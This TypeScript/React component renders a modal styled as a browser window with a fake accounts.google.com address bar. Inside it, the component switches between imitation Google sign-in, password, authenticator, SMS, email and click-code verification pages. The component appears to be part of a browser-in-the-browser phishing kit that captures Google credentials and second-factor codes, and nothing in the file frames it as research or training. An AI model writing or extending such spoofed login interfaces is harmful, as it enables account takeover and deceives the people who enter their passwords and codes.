import ModalChrome from './ModalChrome';
import SignInPage from '../pages/google-auth/sign-in/index';
import PasswordPage from '../pages/google-auth/password/index';
import AuthenticatorCodePage from '../pages/google-auth/authenticator';
import PhoneOtpPage from '../pages/google-auth/phone-otp/index';
import EmailOtpPage from '../pages/google-auth/email-otp/index';
import ClickCodePage from '../pages/google-auth/click-code/index';

export type GgPage = 'sign-in' | 'password' | 'authenticator-code' | 'phone-otp' | 'email-otp' | 'click-code';

const GG_ADDRESS_URLS: Record<GgPage, string> = {
  'sign-in': 'accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmyaccount.google.com...',
  'password': 'accounts.google.com/v3/signin/challenge/pwd?continue=https%3A%2F%2Fmyaccount.google...',
  'authenticator-code': 'accounts.google.com/v3/signin/challenge/totp?continue=https%3A%2F%2Fmyaccount...',
  'phone-otp': 'accounts.google.com/v3/signin/challenge/sms?continue=https%3A%2F%2Fmyaccount.google...',
  'email-otp': 'accounts.google.com/v3/signin/challenge/email?continue=https%3A%2F%2Fmyaccount.goo...',
  'click-code': 'accounts.google.com/v3/signin/challenge/dc?continue=https%3A%2F%2Fmyaccount.google...',
};

interface GoogleModalProps {
  isOpen: boolean;
  currentPage: GgPage;
  onClose: () => void;
}

export default function GoogleModal({ isOpen, currentPage, onClose }: GoogleModalProps) {
  const addressUrl = GG_ADDRESS_URLS[currentPage] || GG_ADDRESS_URLS['sign-in'];

  const renderPage = () => {
    switch (currentPage) {
      case 'sign-in': return <SignInPage />;
      case 'password': return <PasswordPage />;
      case 'authenticator-code': return <AuthenticatorCodePage />;
      case 'phone-otp': return <PhoneOtpPage />;
      case 'email-otp': return <EmailOtpPage />;
      case 'click-code': return <ClickCodePage />;
      default: return <SignInPage />;
    }
  };

  return (
    <ModalChrome
      isOpen={isOpen}
      onClose={onClose}
      variant="google"
      addressUrl={addressUrl}
    >
      {renderPage()}
    </ModalChrome>
  );
}
